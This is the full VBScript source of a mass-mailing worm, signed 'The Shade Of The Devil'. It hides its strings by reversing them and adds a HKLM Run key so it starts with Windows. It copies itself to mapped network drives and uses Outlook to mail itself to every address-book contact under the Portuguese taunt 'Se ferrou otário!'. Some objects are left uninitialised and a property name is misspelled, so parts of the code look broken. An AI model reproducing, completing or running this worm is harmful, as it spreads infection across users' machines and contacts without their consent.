' T-31
' Feito por: The Shade Of The Devil
On Error Resume Next

Dim PBKL6W
Dim C7NIWK
Dim O4S85
Dim A3Q1M
Dim EBK
Dim Q27WGX
Dim QELY6JN
Dim NFR
Dim CCSOFR39
Dim D6CU

Set C7NIWK = CreateObject( KB3LHTVZ( "llehS.tpircSW" ) )
C7NIWK.RegWrite KB3LHTVZ( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & KB3LHTVZ( "WPL" ), PBKL6W.BuildPath( PBKL6W.GetSpecialFolder(1), KB3LHTVZ( "SBV.WPL" ) )


Set O4S85 = CreateObject( KB3LHTVZ( "krowteN.tpircSW" ) )
Set EBK = O4S85.EnumNetworkDrives

If EBK.Count <> 0 Then
   For A3Q1M = 0 To EBK.Count - 1
       If InStr( EBK.Item( A3Q1M), KB3LHTVZ( "\" ) ) <> 0 Then
          PBKL6W.CopyFile WScript.ScriptFullName, PBKL6W.BuildPath( EBK.Item( A3Q1M), KB3LHTVZ( "SBV.WPL" ) ) 
       End If
   Next
End If

A3Q1M = C7NIWK.RegRead( KB3LHTVZ( "\ENIHCAM_LACOL_YEKH" ) & KB3LHTVZ( "WPL" ) )

If A3Q1M = "" Or A3Q1M > 20 Then
   A3Q1M = 0
End If

If A3Q1M = 0 Then
   Set NFR = CreateObject( KB3LHTVZ( "noitacilppA.kooltuO" ) )
   Set Q27WGX = NFR.GetNameSpace( KB3LHTVZ( "IPAM" ) )

   For Each QELY6JN In Q27WGX.AddressLists
       Set EBK = NFR.CreateItem( 0 )

       For CCSOFR39 = 1 To QELY6JN.AddressEntries.Count
           Set D6CU = QELY6JN.AddressEntries( CCSOFR39 )

           If CCSOFR39 = 1 Then
              EBK.BCC = D6CU.Address
           Else
              EBK.BCC = EBK.BCC & KB3LHTVZ( " ;" ) & D6CU.Address
           End If
       Next

       EBK.Subject = KB3LHTVZ( "!oiràto uorref eS" )
       EBK.Body = KB3LHTVZ( "!oiràto uorref eS" )
       EBK.Attachmets.Add WScript.ScriptFullName
       EBK.DeleteAfterSubmit = True
       EBK.Send
   Next

   A3Q1M = 0
End If

C7NIWK.RegWrite KB3LHTVZ( "\ENIHCAM_LACOL_YEKH" ) & KB3LHTVZ( "WPL" ), A3Q1M + 1

Function KB3LHTVZ( BHO )
   Dim LHHP
   Dim B9WVV
   Dim J9CKZV

   LHHP = ""

   For B9WVV = 1 To Len( BHO )
       J9CKZV = Mid( BHO, B9WVV, 1 )

       LHHP = J9CKZV & LHHP
   Next

   KB3LHTVZ = LHHP
End Function
